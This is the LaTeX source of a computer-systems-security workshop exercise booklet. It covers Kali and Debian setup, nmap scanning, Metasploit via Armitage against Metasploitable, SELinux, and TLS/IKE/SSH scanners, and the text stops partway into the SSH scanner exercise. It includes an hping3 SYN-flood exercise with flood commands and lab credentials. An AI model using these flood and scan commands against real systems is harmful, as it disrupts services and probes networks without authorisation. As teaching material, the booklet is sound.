\documentclass[a4paper,11pt,notitlepage]{report}
% Henrik Lund Kramshoej, February 2001
% hlk@security6.net,
% My standard packages
\usepackage{zencurity-network-exercises}

\begin{document}

\rm
\selectlanguage{english}

\newcommand{\emne}[1]{Computer Systems Security workshop}
\newcommand{\kursus}[1]{Computer Systems Security workshop}
\newcommand{\kursusnavn}[1]{Computer Systems Security workshop\\ exercises}

\mytitle{Computer Systems Security}{exercises}

\pagenumbering{roman}
\setcounter{tocdepth}{0}

\normal

{\color{titlecolor}\tableofcontents}
%\listoffigures - not used
%\listoftables - not used

\normal
\pagestyle{fancyplain}
\chapter*{\color{titlecolor}Preface}
\markboth{Preface}{}

This material is prepared for use in \emph{\kursus} and was prepared by
Henrik Lund Kramshoej, \link{http://www.zencurity.com} .
It describes the networking setup and
applications for trainings and workshops where hands-on exercises are needed.

\vskip 1cm
Further a presentation is used which is available as PDF from kramse@Github\\
Look for \jobname in the repo security-courses.

These exercises are expected to be performed in a training setting with network connected systems. The exercises use a number of tools which can be copied and reused after training. A lot is described about setting up your workstation in the repo

\link{https://github.com/kramse/kramse-labs}



\section*{\color{titlecolor}Prerequisites}

This material expect that participants have a working knowledge of
TCP/IP from a user perspective. Basic concepts such as web site addresses and email should be known as well as IP-addresses and common protocols like DHCP.

\vskip 1cm
Have fun and learn
\eject

% =================== body of the document ===============
% Arabic page numbers
\pagenumbering{arabic}
\rhead{\fancyplain{}{\bf \chaptername\ \thechapter}}

% Main chapters
%---------------------------------------------------------------------
% gennemgang af emnet
% check questions

\chapter*{\color{titlecolor}Exercise content}
\markboth{Exercise content}{}

Most exercises follow the same procedure and has the following content:
\begin{itemize}
\item {\bf Objective:} What is the exercise about, the objective
\item {\bf Purpose:} What is to be the expected outcome and goal of doing this exercise
\item {\bf Suggested method:} suggest a way to get started
\item {\bf Hints:} one or more hints and tips or even description how to
do the actual exercises
\item {\bf Solution:} one possible solution is specified
\item {\bf Discussion:} Further things to note about the exercises, things to remember and discuss
\end{itemize}

Please note that the method and contents are similar to real life scenarios and does not detail every step of doing the exercises. Entering commands directly from a book only teaches typing, while the exercises are designed to help you become able to learn and actually research solutions.


\chapter{Download Kali Linux Revealed (KLR) Book 10 min}
\label{ex:downloadKLR}


\hlkimage{3cm}{kali-linux-revealed.jpg}

\emph{Kali Linux Revealed  Mastering the Penetration Testing Distribution}


{\bf Objective:}\\
We need a Kali Linux for running tools during the course. This is open source, and the developers have released a whole book about running Kali Linux.

This is named Kali Linux Revealed (KLR)

{\bf Purpose:}\\
We need to install Kali Linux in a few moments, so better have the instructions ready.

{\bf Suggested method:}\\
Create folders for educational materials. Go to \link{https://www.kali.org/download-kali-linux-revealed-book/}
Read and follow the instructions for downloading the book.

{\bf Solution:}\\
When you have a directory structure for download for this course, and the book KLR in PDF you are done.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Kali Linux is a free pentesting platform, and probably worth more than \$10.000

The book KLR is free, but you can buy/donate, and I recommend it.



\chapter{Download Debian Administrator’s Handbook (DEB) Book 10 min}
\label{ex:sw-downloadDEB}

\hlkimage{3cm}{book-debian-administrators-handbook.jpg}


{\bf Objective:}\\
We need a Linux for running some tools during the course. I have chosen Debian Linux as this is open source, and the developers have released a whole book about running it.

This book is named
\emph{The Debian Administrator’s Handbook},  - shortened DEB

{\bf Purpose:}\\
We need to install Debian Linux in a few moments, so better have the instructions ready.

{\bf Suggested method:}\\
Create folders for educational materials. Go to download from the link \url{https://debian-handbook.info/}
Read and follow the instructions for downloading the book.

{\bf Solution:}\\
When you have a directory structure for download for this course, and the book DEB in PDF you are done.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Debian Linux is a free operating system platform.

The book DEB is free, but you can buy/donate to Debian, and I recommend it.

Not curriculum but explains how to use Debian Linux




\chapter{Check your Kali VM, run Kali Linux 30 min}
\label{ex:basicVM}

\hlkimage{10cm}{kali-linux.png}

{\bf Objective:}\\
Make sure your virtual machine is in working order.

We need a Kali Linux for running tools during the course.

{\bf Purpose:}\\
If your VM is not installed and updated we will run into trouble later.

{\bf Suggested method:}\\
Go to \link{https://github.com/kramse/kramse-labs/}

Read the instructions for the setup of a Kali VM.

{\bf Hints:}\\
If you allocate enough memory and disk you wont have problems.

{\bf Solution:}\\
When you have a updated virtualisation software and Kali Linux, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Kali Linux includes many hacker tools and should be known by anyone working in infosec.

\chapter{Check your Debian VM 10 min}
\label{ex:basicDebianVM}

\hlkimage{3cm}{debian-xfce.png}

{\bf Objective:}\\
Make sure your Debian virtual machine is in working order.

We need a Debian 10 Linux for running a few extra tools during the course.

{\Large \bf This is a bonus exercise - only one Debian is needed per team.}

{\bf Purpose:}\\
If your VM is not installed and updated we will run into trouble later.

{\bf Suggested method:}\\
Go to \link{https://github.com/kramse/kramse-labs/}

Read the instructions for the setup of a Kali VM.

{\bf Hints:}\\

{\bf Solution:}\\
When you have a updated virtualisation software and Kali Linux, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.



\chapter{Investigate /etc 10 min}
\label{ex:basicLinuxetc}


{\bf Objective:}\\
We will investigate the /etc directory on Linux

We need a Kali Linux and a Debian Linux VM, to compare


{\bf Purpose:}\\
Start seeing example configuration files, including:
\begin{itemize}
  \item User database \verb+/etc/passwd+ and \verb+/etc/group+
  \item The password database \verb+/etc/shadow+
\end{itemize}

{\bf Suggested method:}\\
Boot your Linux VMs, log in

Investigate permissions for the user database files \verb+passwd+ and \verb+shadow+

{\bf Hints:}\\
Linux has many tools for viewing files, the most efficient would be less.

\begin{alltt}
hlk@debian:~$ cd /etc
hlk@debian:/etc$ ls -l shadow passwd
-rw-r--r-- 1 root root   2203 Mar 26 17:27 passwd
-rw-r----- 1 root shadow 1250 Mar 26 17:27 shadow
hlk@debian:/etc$ ls
... all files and directories shown, investigate more if you like
\end{alltt}

Showing a single file: \verb+less /etc/passwd+ and press q to quit

Showing multiple files: \verb+less /etc/*+ then :n for next and q for quit

\begin{alltt}
Trying reading the shadow file as your regular user:
user@debian-9-lab:/etc$ cat /etc/shadow
cat: /etc/shadow: Permission denied
\end{alltt}

Why is that? Try switching to root, using su or sudo, and redo the command.

{\bf Solution:}\\
When you have seen the most basic files you are done.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.




\chapter{Enable UFW firewall - 10 min}
\label{ex:debian-firewall}

{\bf Objective:}\\
Turn on a firewall and configure a few simple rules.

{\bf Purpose:}\\
See how easy it is to restrict incoming connections to a server.


{\bf Suggested method:}\\
Install a utility for firewall configuration.

You could also perform Nmap port scan with the firewall enabled and disabled.

{\bf Hints:}\\
Using the ufw package it is very easy to configure the firewall on Linux.

Install and configuration can be done using these commands.
\begin{alltt}
root@debian01:~# apt install ufw
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following NEW packages will be installed:
  ufw
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 164 kB of archives.
After this operation, 848 kB of additional disk space will be used.
Get:1 http://mirrors.dotsrc.org/debian stretch/main amd64 ufw all 0.35-4 [164 kB]
Fetched 164 kB in 2s (60.2 kB/s)
...
root@debian01:~# ufw allow 22/tcp
Rules updated
Rules updated (v6)
root@debian01:~# ufw enable
Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
Firewall is active and enabled on system startup
root@debian01:~# ufw status numbered
Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 22/tcp (v6)                ALLOW IN    Anywhere (v6)
\end{alltt}

Also allow port 80/tcp and port 443/tcp - and install a web server. Recommend Nginx \verb+apt-get install nginx+

{\bf Solution:}\\
When firewall is enabled and you can still connect to Secure Shell (SSH) and web service, you are done.

{\bf Discussion:}\\
Further configuration would often require adding source prefixes which are allowed to connect to specific services. If this was a database server the database service should probably not be reachable from all of the Internet.

Web interfaces also exist, but are more suited for a centralized firewall.

Configuration of this firewall can be done using ansible, see the documentation and examples at \url{https://docs.ansible.com/ansible/latest/modules/ufw_module.html}

Should you have both a centralized firewall in front of servers, and local firewall on each server? Discuss within your team.


\chapter{Git tutorials - 15min}
\label{ex:git-tutorial}


\hlkimage{3cm}{git-logo.png}

{\bf Objective:}\\
Try the program Git locally on your workstation

{\bf Purpose:}\\
Running Git will allow you to clone repositories from others easily. This is a great way to get new software packages, and share your own.

Git is the name of the tool, and Github is a popular site for hosting git repositories.

{\bf Suggested method:}\\
Run the program from your Linux VM. You can also clone from your Windows or Mac OS X computer. Multiple graphical front-end programs exist too.


First make sure your system is updated, as root run:

\begin{minted}[fontsize=\footnotesize]{shell}
sudo apt-get update && apt-get -y upgrade && apt-get -y dist-upgrade
\end{minted}
You should reboot if the kernel is upgraded :-)

Second make sure your system has Git, ansible and my playbooks: (as root run, or with sudo as shown)
\begin{minted}[fontsize=\footnotesize]{shell}
sudo apt -y install ansible git
\end{minted}


Most important are Git clone and pull:
\begin{alltt}\footnotesize
user@Projects:tt$ {\bf git clone https://github.com/kramse/kramse-labs.git}
Cloning into 'kramse-labs'...
remote: Enumerating objects: 283, done.
remote: Total 283 (delta 0), reused 0 (delta 0), pack-reused 283
Receiving objects: 100% (283/283), 215.04 KiB | 898.00 KiB/s, done.
Resolving deltas: 100% (145/145), done.

user@Projects:tt$ {\bf cd kramse-labs/}

user@Projects:kramse-labs$ {\bf ls}
LICENSE  README.md  core-net-lab  lab-network  suricatazeek  work-station
user@Projects:kramse-labs$ git pull
Already up to date.
\end{alltt}

If you want to install the Atom editor, you can run the Ansible playbook from the workstation directory.

Then run it with:
\begin{minted}[fontsize=\footnotesize]{shell}
cd ~/kramse-labs/workstation
ansible-playbook -v 1-dependencies
\end{minted}



{\bf Hints:}\\
Browse the Git tutorials on \link{https://git-scm.com/docs/gittutorial}\\
and \link{https://guides.github.com/activities/hello-world/}

We will not do the whole tutorials within 15 minutes, but get an idea of the command line, and see examples. Refer back to these tutorials when needed or do them at home.

Note: you don't need an account on Github to download/clone repositories, but having an acccount allows you to save repositories yourself and is recommended.

{\bf Solution:}\\
When you have tried the tool and seen the tutorials you are done.

{\bf Discussion:}\\
Before Git there has been a range of version control systems,\\
see \link{https://en.wikipedia.org/wiki/Version\_control} for more details.




\chapter{Bonus: Use Ansible to install Elastic Stack}
\label{ex:basicansible}


{\bf Objective:}\\
Run Elasticsearch

{\bf Purpose:}\\
See an example tool used for many projects, Elasticsearch from the Elastic Stack

{\bf Suggested method:}\\
We will run Elasticsearch, either using the method from:\\{\footnotesize
\url{https://www.elastic.co/guide/en/elastic-stack-get-started/current/get-started-elastic-stack.html}}

or by the method described below using Ansible - your choice.

Ansible used below is a configuration management tool \url{https://www.ansible.com/} and you can adjust them for production use!

I try to test my playbooks using both Ubuntu and Debian Linux, but Debian is the main target for this training.

First make sure your system is updated, as root run:

\begin{minted}[fontsize=\footnotesize]{shell}
apt-get update && apt-get -y upgrade && apt-get -y dist-upgrade
\end{minted}

You should reboot if the kernel is upgraded :-)

Second make sure your system has ansible and my playbooks: (as root run)
\begin{minted}[fontsize=\footnotesize]{shell}
apt -y install ansible git
git clone https://github.com/kramse/kramse-labs
\end{minted}

We will run the playbooks locally, while a normal Ansible setup would use SSH to connect to the remote node.

Then it should be easy to run Ansible playbooks, like this: (again as root, most packet sniffing things will need root too later)

\begin{minted}[fontsize=\footnotesize]{shell}
cd kramse-labs/suricatazeek
ansible-playbook -v 1-dependencies.yml 2-suricatazeek.yml 3-elasticstack.yml
\end{minted}

Note: I keep these playbooks flat and simple, but you should investigate Ansible roles for real deployments.

If I update these, it might be necessary to update your copy of the playbooks. Run this while you are in the cloned repository:

\begin{minted}[fontsize=\footnotesize]{shell}
git pull
\end{minted}

Note: usually I would recommend running git clone as your personal user, and then use sudo command to run some commands as root. In a training environment it is OK if you want to run everything as root. Just beware.

Note: these instructions are originally from the course\\
Go to \url{https://github.com/kramse/kramse-labs/tree/master/suricatazeek}

{\bf Hints:}\\
Ansible is great for automating stuff, so by running the playbooks we can get a whole lot of programs installed, files modified - avoiding the Vi editor \smiley

Example playbook content, installing software using APT:
\begin{minted}[fontsize=\footnotesize]{yaml}
apt:
    name: "{{ packages }}"
    vars:
      packages:
        - nmap
        - curl
        - iperf
        ...
\end{minted}

{\bf Solution:}\\
When you have a updated VM and Ansible running, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.




\chapter{Discover active systems ping sweep 10 min}
\label{ex:nmap-pingsweep}
\hlkimage{5cm}{nmap-zenmap.png}

{\bf Objective:}\\
Use nmap to discover active systems

{\bf Purpose:}\\
Know how to use nmap to scan networks for active systems.

{\bf Suggested method:}\\

\begin{enumerate}
\item First download the {\bf Zenmap RPM} file with type \verb+.rpm+ from\\
 \url{https://nmap.org/download}
\item Install the tool Alien, \verb+apt install alien+
\item then convert to .deb file using the tool alien,\\
 \verb+alien *.rpm+
\item install like a regular package, \verb+dpkg -i *.deb+
\end{enumerate}

Process is described in various posts around the internet. for example:\\
\url{https://lifars.com/2020/01/zenmap-installation-guide-kali-linux-2019-4/}

Try different scans,
\begin{itemize}
\item Ping sweep to find active systems
\item Port sweeps to find active systems with specific ports
\end{itemize}

{\bf Hints:} \\
Try nmap in sweep mode - and you may run this from Zenmap

{\bf Solution:}\\
Use the command below as examples:
\begin{itemize}
\item Ping sweep \verb+nmap -sP 10.0.45.*+
\item Port sweeps \verb+nmap -p 80 10.0.45.*+
\end{itemize}

{\bf Discussion:}\\
Quick scans quickly reveal interesting hosts, ports and services

Also now make sure you understand difference between single host scan
10.0.45.123/32, a whole subnet /24 ~250 hosts 10.0.45.0/24 and other more advanced targeteting like 10.0.45.0/25 and 10.0.45.1-10


\chapter{Execute nmap TCP and UDP port scan 20 min}
\label{ex:nmap-synscan}


{\bf Objective:} \\
Use nmap to discover important open ports on active systems

{\bf Purpose:}\\
Finding open ports will allow you to find vulnerabilities on these ports.

{\bf Suggested method:}\\
Use \verb+nmap -p 1-1024 server+ to scan the first 1024 TCP
ports and use Nmap without ports. What is scanned then?

Try to use \verb+nmap -sU+ to scan using UDP ports, not really possible if a firewall is in place.

If a firewall blocks ICMP you might need to add \verb+-Pn+ to make nmap scan even if there are no Ping responses

{\bf Hints:} \\
Sample command: \verb+nmap -Pn -sU -p1-1024 server+ UDP port scanning
1024 ports without doing a Ping first

{\bf Solution:}\\
Discover some active systems and most interesting ports, which are 1-1024 and the built-in list of popular ports.

{\bf Discussion:}\\
There is a lot of documentation about the nmap portscanner, even a book by the author
of nmap. Make sure to visit \link{http://www.nmap.org}

TCP and UDP is very different when scanning. TCP is connection/flow oriented and requires a handshake which is very easy to identify. UDP does not have a handshake and most applications will not respond to probes from nmap. If there is no firewall the operating system will respond to UDP probes on closed ports - and the ones that do not respond must be open.

When doing UDP scan on the internet you will almost never get a response, so you cannot tell open (not responding services) from blocked ports (firewall drop packets). Instead try using specific service programs for the services, sample program could be \verb+nsping+ which sends DNS packets, and will often get a response from a DNS server running on UDP port 53.

\chapter{Perform nmap OS detection 10 min}
\label{ex:nmap-os}

{\bf Objective:} \\
Use nmap OS detection and see if you can guess the brand of devices on the network

{\bf Purpose:}\\
Getting the operating system of a system will allow you to focus your next attacks.

{\bf Suggested method:}\\
Look at the list of active systems, or do a ping sweep.

Then add the OS detection using the option \verb+-O+

Better to use -A all the time, includes even more scripts and advanced stuff
See the next exercise.

{\bf Hints:} \\
The nmap can send a lot of packets that will get different responses, depending on the operating system. TCP/IP is implemented using various constants chosen by the implementors, they have chosen different standard packet TTL etc.

{\bf Solution:}\\
Use a command like \verb+nmap -O -p1-100 10.0.45.45+ or  \verb+nmap -A -p1-100 10.0.45.45+


{\bf Discussion:}\\
nmap OS detection is not a full proof way of knowing the actual operating system, but in most cases in can detect the family and in some cases it can identify the exact patch level of the system.




\chapter{Run Armitage 30min}
\label{ex:armitage-basic}

{\bf Objective:}\\
Try hacking using a graphical program, see how quick and easy it can be.

{\bf Purpose:}\\
Show that when a vulnerability exist attacks can be executed quickly and easy.

{\bf Suggested method:}\\

Running Armitage as a gui on top of Metasploit is the easiest way to do this.

\begin{enumerate}
\item Boot up Kali Linux
\item Boot up Metasploitable, available in multiple versions
\item Run Armitage
\item Run \verb+db_nmap+ to scan, or select from menus
\item Use menus to execute attacks
\item Note which succeeded, describe those attacks that succeeded in relation to MITRE ATT\&CK framework
\end{enumerate}

{\bf Hints:}\\
Running Metasploit against Metasploitable - which is a vulnerable system - should result in multiple vulnerabilities exploited.

Each of these may have different characteristics.

We are aiming at:
\begin{itemize}
\item Vulnerable application - root access
\item Vulnerable application - non-root access, would need privilege escalation
\item Bad password allowing \emph{Brute Force} access, msfadmin/msfadmin - see also \emph{Valid Accounts}
\end{itemize}


{\bf Solution:}\\
When you have exploited and mapped at least one vulnerability you are done, but should spend more time.

{\bf Discussion:}\\
Do we need these frameworks? What are the benefits? - can we become product blind - so we only see what these framework cover.



\chapter{SELinux Introduction up to 60min}
\label{ex:se-linux-intro}

{\bf Objective:}\\
Check out the SELinux system\\
\link{https://www.debian.org/doc/manuals/debian-handbook/sect.selinux.en.html}

and the setup instructions at:\\
\link{https://wiki.debian.org/SELinux/Setup}

(Not working right now - Create a secret file, that you can read, but root cant.)

{\bf Purpose:}\\
Everybody reads about Discretionary Access Control (DAC) and Mandatory Access Control (MAC) but few realize that Linux implements it.


{\bf Suggested method:}\\
Try enabling and disabling the policies in your Debian VM.

First install prerequisites - approx 75MB download on my system:\\
\verb+apt-get install selinux-basics selinux-policy-default auditd+

Then run activation of SELinux:\\
\verb+selinux-activate+

\begin{alltt}
  root@debian-lab:~# selinux-activate
  Activating SE Linux
  Generating grub configuration file ...
  Found linux image: /boot/vmlinuz-4.9.0-9-amd64
  Found initrd image: /boot/initrd.img-4.9.0-9-amd64
  Found linux image: /boot/vmlinuz-4.9.0-8-amd64
  Found initrd image: /boot/initrd.img-4.9.0-8-amd64
  done
  SE Linux is activated.  You may need to reboot now.
  root@debian-9-lab:~#
\end{alltt}

Perform the reboot, \verb+shutdown -r now+ then check again.

Not enabled will show this, try again:
\begin{alltt}
root@debian-lab:~# sestatus
SELinux status:                 disabled
\end{alltt}

Enabled, but not the current mode and mode from config file discrepancy:
\begin{alltt}
root@debian:~# sestatus
SELinux status:                 enabled
SELinuxfs mount:                /sys/fs/selinux
SELinux root directory:         /etc/selinux
Loaded policy name:             default
Current mode:                   {\bf enforcing}
Mode from config file:          {\bf permissive}
Policy MLS status:              enabled
Policy deny_unknown status:     allowed
Max kernel policy version:      30
\end{alltt}

While playing I had changed the mode temporarily to \emph{enforcing}! Next reboot would make SELinux run in the more \emph{permissive} mode

\subsection{Part 2 - do this when SELinux is enabled}

Create a directory and a test file:
\begin{alltt}
root@debian:~# setenforce 0   // set mode permissive!
root@debian:~# cd
root@debian:~# mkdir /etc/private
root@debian:~# echo "hey" > /etc/private/README
root@debian:~# cat /etc/private/README
hey
root@debian:~#
\end{alltt}

Root can read the file, yay!

Copy example files:
\begin{alltt}
cp -r /usr/share/doc/selinux-policy-dev/examples .
cd examples/

\end{alltt}

\eject

Create a file myprivate.te with this content:
\begin{alltt}
policy_module(myprivate, 1.0)

########################################
#
# Declarations
#
type etc_private_t;
fs_associate(etc_private_t)

type sysadm_t;
type sysadm_exec_t;

userdom_admin_user_template(sysadm_t)

allow sysadm_t etc_private_t:\{dir file\} relabelto;
\end{alltt}

Note last line is missing a sysadm domain, does not work.

Then compile using this: \verb+make myprivate.pp+
\begin{alltt}
root@debian:~/examples# make myprivate.pp
Compiling default myprivate module
/usr/bin/checkmodule:  loading policy configuration from tmp/myprivate.tmp
/usr/bin/checkmodule:  policy configuration loaded
/usr/bin/checkmodule:  writing binary representation (version 17) to tmp/myprivate.mod
Creating default myprivate.pp policy package
rm tmp/myprivate.mod.fc tmp/myprivate.mod
root@debian:~/examples#
\end{alltt}

then it should have been possible to enable/disable enforcing mode, and see the file becoming unreadable - even by root.

Something is wrong, when enabling enforcing mode, the chcon command fails:
\begin{alltt}
root@debian:~/examples# setenforce 1
root@debian:~/examples# chcon -R -t etc_private_t /etc/private/README
chcon: failed to change context of '/etc/private/README' to ‘system_u:object_r:etc_private_t:s0’: Invalid argument
root@debian:~/examples# chcon -R -t etc_private_t /etc/private
chcon: failed to change context of 'README' to ‘system_u:object_r:etc_private_t:s0’: Invalid argument
chcon: failed to change context of '/etc/private' to ‘system_u:object_r:etc_private_t:s0’: Invalid argument

root@debian:~/examples# setenforce 0
root@debian:~/examples# chcon -R -t etc_private_t /etc/private/README
root@debian:~/examples#
// When Linux returns to the command prompt without messages no errors were observed
\end{alltt}

So SELinux IS preventing us from doing it :-D

this example is in parts based on this blog post:\\
\link{http://blog.siphos.be/2015/07/restricting-even-root-access-to-a-folder/}


{\bf Hints:}\\
Keeping SELinux enabled may NOT be a good idea, since some tools may not work correctly, until policies are downloaded, written or installed.

Temporarily disable SELinux:\\
\verb+echo 0 > /sys/fs/selinux/enforce+

Temporarily enable SELinux:\\
\verb+echo 1 > /sys/fs/selinux/enforce+

or use the command \verb+setenforce 0+ or
\verb+setenforce 1+

The main config for setting permissive or enforcing mode is
\verb+/etc/selinux/config+:
\begin{alltt}
root@debian-lab:~# cat /etc/selinux/config
# This file controls the state of SELinux on the system.
# SELINUX= can take one of these three values:
# enforcing - SELinux security policy is enforced.
# permissive - SELinux prints warnings instead of enforcing.
# disabled - No SELinux policy is loaded.
SELINUX=permissive
# SELINUXTYPE= can take one of these two values:
# default - equivalent to the old strict and targeted policies
# mls     - Multi-Level Security (for military and educational use)
# src     - Custom policy built from source
SELINUXTYPE=default

# SETLOCALDEFS= Check local definition changes
SETLOCALDEFS=0
\end{alltt}


{\bf Solution:}\\
%When you have a small text file which you can read, but root cannot, you are done.
When you have enabled and seen the commands used, you are done.

It is easy to have multiple hours disappear when working with SELinux.

{\bf Discussion:}\\
Yes, the root user can disable the SELinux protection :-D

I had Firefox crash at least once during this exercise, so beware - fancy and bigger applications may crash when using this!

\chapter{Example AUPs up to 30min}
\label{ex:example-AUP}

{\bf Objective:}\\
See real world high level policies

{\bf Purpose:}\\
When writing your first policy it may be hard to know what to include. Starting from an example is often easier.

{\bf Suggested method:}\\
Find your AUP for the ISPs we use, you use, your company uses.

{\bf Hints:}\\
Policies for different environments are often very different in scope and goals.

Book mentions military and commercial, but an ISP, University and a commercial enterprise have very different methods and requirements.

Example, how do you handle BYOD Bring your own devices, University you expect students to bring them, in a secure enterprise only company devices may be allowed.

{\bf Solution:}\\
When you have seen at least two different policies you are done.

{\bf Discussion:}\\
How do you both write AND create awareness about a policy?



\chapter{SYN flooding 101 - 60min}
\label{ex:syn-flood-101}

{\bf Objective:}\\
Start a webserver attack using SYN flooding tool hping3.

{\bf Purpose:}\\
See how easy it is to produce packets on a network using hacker programs.

The tool we will use is very flexible and can produce ICMP, UDP and TCP using very few options.

\begin{alltt}\footnotesize
-1 --icmp
       ICMP  mode,  by  default  hping3  will  send  ICMP echo-request, you can set other ICMP
       type/code using --icmptype --icmpcode options.

-2 --udp
       UDP mode, by default hping3 will send udp to target host's port 0.  UDP header  tunable
       options are the following: --baseport, --destport, --keep.
\end{alltt}

TCP mode is default, so no option needed.


{\bf Suggested method:}\\
Connect to the LAB network using Ethernet! Borrow a USB network card if you dont have one.

Start your Kali VM in bridged mode, try a basic TCP flooding attack against the server provided by the instructor, or your own Debian server.

\begin{alltt}\footnotesize
hping3 --flood -p 80 10.0.45.12
\end{alltt}

You should see something like this:
\begin{alltt}\footnotesize
HPING 10.0.45.12: NO FLAGS are set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
^C
--- 10.0.45.12 hping statistic ---
352339 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
\end{alltt}

Try doing the most common attacks, RTFM hping3:
\begin{itemize}
\item ICMP flooding
\item UDP flooding, try port 53 and port 123
\item TCP flooding, try port 22 or port 80 on your debian perhaps
\end{itemize}


{\bf Hints:}\\
The tool we use can do a lot of different things, and you can control the speed. You can measure at the server being attacked or what you are sending, commonly using ifpps or such programs can help.

This allows you to use the tool to test devices and find the breaking point, which is more interesting than if you can overload, because you always can.
\begin{alltt}\footnotesize
-i --interval
       Wait  the  specified  number  of  seconds or micro seconds between sending each packet.
       --interval X set wait to X seconds, --interval uX set wait to X micro seconds.  The de‐
       fault  is  to  wait one second between each packet. Using hping3 to transfer files tune
       this option is really important in order to increase transfer rate. Even  using  hping3
       to  perform  idle/spoofing  scanning  you should tune this option, see HPING3-HOWTO for
       more information.

--fast Alias for -i u10000. Hping will send 10 packets for second.

--faster
       Alias for -i u1. Faster then --fast ;) (but not as fast as your computer can send pack‐
       ets due to the signal-driven design).

--flood
       Sent  packets  as fast as possible, without taking care to show incoming replies.  This
       is ways faster than to specify the -i u0 option.
\end{alltt}

{\bf Solution:}\\
When your team has sent +1 million packets per second into the network, from one or two laptops - you are done.

{\bf Discussion:}\\
Gigabit Ethernet can send up to 1.4 million packets per second, pps.

There is a presentation about DDoS protection with low level technical measures to implement at\\
{\footnotesize \link{https://github.com/kramse/security-courses/tree/master/presentations/network/introduction-ddos-testing}}





\chapter{RBAC Access permissions on GitHub 30-45min}
\label{ex:github-perms}

{\bf Objective:}\\
See actual real life example of permissions.

Note: This exercise requires a GitHub account, so make sure your group has one. Maybe do groups of 3-4 for more discussion.

{\bf Purpose:}\\
GitHub is a very popular code sharing site.

{\bf Suggested method:}\\
Go to GitHub web page:\\
\link{https://help.github.com/en/articles/access-permissions-on-github}

Follow links to other pages, like:\\
\link{https://help.github.com/en/articles/permission-levels-for-an-organization}


{\bf Hints:}\\
Some might already have an account on GitHub - maybe work through adding a repository and adding collaborators.

If you have an organisation, even better.

{\bf Solution:}\\
When you have discussed GitHub permissions and played with a repository you are done.

{\bf Discussion:}\\
The internet is decentralized, but recent years see more centralization - GitHub, DNS Google DNS, Cloudflare.

What are some problems in this?



\chapter{SSL/TLS scanners 15 min}
\label{ex:sslscan}

{\bf Objective:}\\
Try the Online Qualys SSLLabs scanner \link{https://www.ssllabs.com/}
Try the command line tool sslscan checking servers - can check both HTTPS and non-HTTPS protocols!

{\bf Purpose:}\\
Learn how to efficiently check TLS settings on remote services.

{\bf Suggested method:}\\
Run the tool against a couple of sites of your choice.

\begin{alltt}\small
root@kali:~# sslscan --ssl2 web.kramse.dk
Version: 1.10.5-static
OpenSSL 1.0.2e-dev xx XXX xxxx

Testing SSL server web.kramse.dk on port 443
...
  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  *.kramse.dk
Altnames: DNS:*.kramse.dk, DNS:kramse.dk
Issuer:   AlphaSSL CA - SHA256 - G2
\end{alltt}

Also run it without \verb+--ssl2+ and against SMTPTLS if possible.

{\bf Hints:}\\
Originally sslscan is from \link{http://www.titania.co.uk} but use the version on Kali, install with apt if not installed.

{\bf Solution:}\\
When you can run and understand what the tool does, you are done.

{\bf Discussion:}\\
SSLscan can check your own sites, while Qualys SSLLabs only can test from hostname



\chapter{Nmap Ikescan IPsec}
\label{ex:nmap-ikescan}

{\bf unfinished, will be updated later}

{\bf Objective:}\\
Try Nmap and Ikescan

{\bf Purpose:}\\
Check settings on Internet Key Exchange protocol, which is a part of IPsec IP security framework - which is used for Virtual Private Network (VPN) tunnels.

{\bf Suggested method:}\\
Ike-scan is available in the Kali package system, so install using apt.

It seems the code is now on Github:\\
\url{https://github.com/royhills/ike-scan}

Where you can read more about running the tool.

{\bf Hints:}\\
This tools sends a lot of proposals to a firewall/VPN gateway and recognizes the responses.

You should look for 3DES, DES and older versions of MAC algorithms like MD5 and SHA1.

Note: you can also try the ike-version script in Nmap, which can give a little extra information:
\begin{alltt}
-- @usage
-- nmap -sU -sV -p 500 <target>
-- nmap -sU -p 500 --script ike-version <target>
--
-- @output
-- PORT    STATE SERVICE REASON       VERSION
-- 500/udp open  isakmp  udp-response Fortinet FortiGate v5
-- | ike-version:
-- |   vendor_id: Fortinet FortiGate v5
-- |   attributes:
-- |     Dead Peer Detection v1.0
-- |_    XAUTH
-- Service Info: OS: Fortigate v5; Device: Network Security Appliance; CPE: cpe:/h:fortinet:fortigate
\end{alltt}

Note: port 500/udp and 3500/udp are the common ones used for IKE.

{\bf Solution:}\\
When you have tried the tool against at least one VPN gateway you are done. Perhaps try it against your company VPN, this is NOT an attack - more like a probe sent.

{\bf Discussion:}\\
You should review and update settings for encryption at least once a year, or when news of another attack on algorithms are found.

The current recommendation for VPN connections with IKE are listed below.

\begin{quote}
  Use the following guidelines when configuring Internet Key Exchange (IKE) in VPN technologies:\\
* Avoid IKE Groups 1, 2, and 5.\\
* Use IKE Group 15 or 16 and employ 3072-bit and 4096-bit DH, respectively.\\
* When possible, use IKE Group 19 or 20. They are the 256-bit and \\
384-bit ECDH groups, respectively.\\
* Use AES for encryption.
\end{quote}
Paper:\\
{\small \link{https://www.cisco.com/c/en/us/about/security-center/next-generation-cryptography.html}}



\chapter{SSH scanners}
\label{ex:nmap-ssh-scanner}

{\bf Objective:}\\
Try ssh scanners, similar to sslscan and Nmap sshscan

{\bf Purpose:}\\
We often need to find older systems with old settings.

{\bf Suggested method:}\\
Use Nmap with built-in scripts for getting the authentication settings from SSH servers

{\bf Hints:}\\
Nmap includes lots of scripts, look into the directory on Kali:

\begin{alltt}\footnotesize
$ ls /usr/share/nmap/scripts/*ssh*
/usr/share/nmap/scripts/ssh2-enum-algos.nse   /usr/share/nmap/scripts/ssh-publickey-acceptance.nse
